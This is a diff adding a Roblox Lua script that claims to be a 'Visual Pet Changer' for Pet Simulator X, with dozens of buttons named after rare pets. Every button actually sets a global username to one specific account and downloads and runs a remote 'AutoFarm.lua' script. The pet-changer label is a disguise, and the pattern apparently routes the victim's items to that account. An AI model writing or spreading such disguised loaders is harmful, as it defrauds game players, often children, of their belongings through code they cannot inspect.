@@ -1,0 +1,255 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "😾 Vesty Hub | Visual Pet Changer (PSX)", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+	Name = "Huges",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+    Tab:AddButton({
+        Name = "Huge Cat",
+        Callback = function()
+  _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+          end
+})
+
+Tab:AddButton({
+	Name = "Huge Pegasus",
+	Callback = function()
+        _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+  	end    
+})
+
+Tab:AddButton({
+    Name = "Huge Crowned Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Easter Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Crowned Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Crowned Pegasus",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge White Balloon Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Blue Balloon Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Chest Mimic",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Neon Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Neon Griffin",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Pumpkin Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Santa Paws",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Forest Wywern",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Huge Doodle Fairy",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "NEW! Huge Party Axolotl",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "NEW! Huge Cupid Corgi",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "NEW! Huge Knife Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "NEW! Huge Pop Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "SECRET! Huge Samurai Dragon",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "SECRET! Huge Unicorn",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "SECRET! Huge Rainbow Lucky Block",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "SECRET! Huge Pinky Lucky Block",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Titanics",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Titanic Jolly Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Titanic Balloon Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Titanic Neon Agony",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Titanic Red Balloon Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "Titanic Blue Balloon Cat",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "NEW! Titanic Hubert",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})
+
+Tab:AddButton({
+    Name = "SECRET! Titanic Hippomelon",
+    Callback = function()
+   _G.Username = slr_aquaking
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
+      end
+})          
